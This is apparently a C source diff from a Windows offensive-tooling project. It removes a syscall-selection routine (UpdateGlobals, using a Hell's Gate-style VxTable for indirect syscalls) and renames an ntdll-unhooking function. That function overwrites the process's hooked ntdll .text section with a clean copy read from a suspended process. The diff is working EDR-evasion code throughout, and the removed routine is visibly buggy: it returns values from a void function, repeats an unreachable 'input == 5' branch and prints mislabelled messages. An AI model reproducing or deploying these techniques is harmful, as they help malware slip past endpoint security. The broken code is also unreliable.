@@ -410,80 +410,10 @@ BOOL GetVXTableEntry(DWORD dwDLLSize, PVOID* pSystemCalls, PVOID pModuleBase, PI
 }
 
 
-EXTERN_C void UpdateGlobals(DWORD input) {
-    printf("Indexes of systemcalls %d\n", sizeof(pSystemCalls) / sizeof(pSystemCalls[0]));
-    uint64_t address = pSystemCalls[rand() % (sizeof(pSystemCalls) / sizeof(pSystemCalls[0]))];    //PVOID address = (PVOID)(0xdeadbeef);
-    //PVOID address = (PVOID)(0xdeadbeef);
-    //uint64_t* address = (uint64_t*)0x00007FF97312D232;
-
-    printf("Getting JMP! 0x%p\n", address);
-    gJMP = address;
-    uint64_t address2 = (uint64_t)address;
-    PULONG oldProts = NULL;
-    getchar();
-    printf("Input val to UpdateGloabls: %d\n", input);
-    getchar();
-
-    if (input == 0) { //Read
-        printf("Wow! Read Syscall Getter called: %d\n", VxTable.Read.wSystemCall);
-        printf("gSSN: 0x%p", &gSSN);
-        gSSN = VxTable.Read.wSystemCall;
-        getchar();
-        return (DWORD)VxTable.Read.wSystemCall;
-    }
-    else if (input == 1) { //Write
-        printf("Wow! WRite Syscall Getter called: %d\n", VxTable.Write.wSystemCall);
-        printf("gSSN: 0x%p", &gSSN);
-        gSSN = VxTable.Write.wSystemCall;
-        getchar();
-        return (DWORD)VxTable.Write.wSystemCall;
-    }
-    else if (input == 2) { //Allocate
-        return VxTable.Allocate.wSystemCall;
-    }
-    else if (input == 3) { //Protect
-        printf("Wow! Protect Syscall Getter called: %d\n", VxTable.Protect.wSystemCall);
-        printf("gSSN: 0x%p", &gSSN);
-        gSSN = VxTable.Protect.wSystemCall;
-        getchar();
-        return VxTable.Protect.wSystemCall;
-    }
-    else if (input == 4) { //ResumeThread
-        printf("Wow! Resume Syscall Getter called: %d\n", VxTable.ResumeThread.wSystemCall);
-        printf("gSSN: 0x%p", &gSSN);
-        gSSN = VxTable.ResumeThread.wSystemCall;
-        getchar();
-        return VxTable.ResumeThread.wSystemCall;
-    }
-    else if (input == 5) { //QueryInfoProcess
-        printf("Wow! QueryInfo Syscall Getter called: %d\n", VxTable.QueryInfoProcess.wSystemCall);
-        printf("gSSN: 0x%p", &gSSN);
-        gSSN = VxTable.QueryInfoProcess.wSystemCall;
-        getchar();
-        return VxTable.QueryInfoProcess.wSystemCall;
-    }
-    else if (input == 6) { //NtCreateFile
-        printf("Wow! QueryInfo Syscall Getter called: %d\n", VxTable.Create.wSystemCall);
-        printf("gSSN: 0x%p", &gSSN);
-        gSSN = VxTable.Create.wSystemCall;
-        getchar();
-        return VxTable.Create.wSystemCall;
-    }
-    else if (input == 5) { //NtMapViewOfSection
-        printf("Wow! QueryInfo Syscall Getter called: %d\n", VxTable.MapViewOfSection.wSystemCall);
-        printf("gSSN: 0x%p", &gSSN);
-        gSSN = VxTable.MapViewOfSection.wSystemCall;
-        getchar();
-        return VxTable.MapViewOfSection.wSystemCall;
-    }
-    printf("Syscall input not found, check your input in C or RCX\n");
-
-}
 
 
 
-
-void UnhookLocalDLL(HANDLE hProcess, IN PVOID pLocalTextSection, IN PVOID pRemoteTextSection,IN DWORD sTextSize,OUT PVOID* pModuleBuffer) {
+void ReadNTDLL(HANDLE hProcess, IN PVOID pLocalTextSection, IN PVOID pRemoteTextSection,IN DWORD sTextSize,OUT PVOID* pModuleBuffer) {
 
     //now we know do to shared memory address space of DLL's, we can copy the base address of our clean suspended process
     //and copy it into a new buffer in this process.
@@ -501,17 +431,20 @@ void UnhookLocalDLL(HANDLE hProcess, IN PVOID pLocalTextSection, IN PVOID pRemot
     printf("Read %d Bytes \n", sReadBbytes);
     printf("Now verify that local text section is replaced w remote: Local Text Section: 0x%p  Remote Text Section: 0x%p\n", pLocalTextSection, pRemoteTextSection);
     getchar();
+    
     //For this to work we need to modify memory perms to allow us to write!
     PDWORD oldProt;
     if (!VirtualProtect(pLocalTextSection, sLocalTextSection, PAGE_EXECUTE_WRITECOPY, &oldProt)) {
         printf("Error changing memory prots\n");
     }
+    
     memcpy(pLocalTextSection, pUnhookedBuf, sLocalTextSection);
 
     if (!VirtualProtect(pLocalTextSection, sLocalTextSection, oldProt, &oldProt)) {
         printf("Error changing memory prots\n");
     }
     getchar();
+
     printf("Local .text Unhooked?\n");
     //Now with a copy of the .text section of the clean suspended process in our local process we can overwrite local .text w that.
     //buf now 
@@ -627,7 +560,6 @@ int main() {
     CreateSuspendedProcess(procName, moduleName, &piSuspended, &siSuspended);
     printf("Suspended proc created.\n");
 
-    GetRemoteText(piSuspended.hProcess, pLocalText,&pRemoteText, sLocalTextSection);
 
     PVOID pLocalUnhookedModule = NULL;
     ReadNTDLL(piSuspended.hProcess, pLocalText, pRemoteText, sLocalTextSection, &pLocalUnhookedModule);
